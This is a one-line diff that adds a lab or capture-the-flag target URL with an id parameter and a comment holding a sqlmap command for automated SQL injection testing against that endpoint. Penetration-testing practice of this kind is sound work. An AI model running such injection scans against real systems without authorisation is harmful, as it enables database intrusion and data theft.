@@ -1,0 +1,1 @@
+http://94.237.58.78:47565/api/quest?id=q1 (GET)  # /usr/bin/sqlmap -r sqli2 --batch --level 3
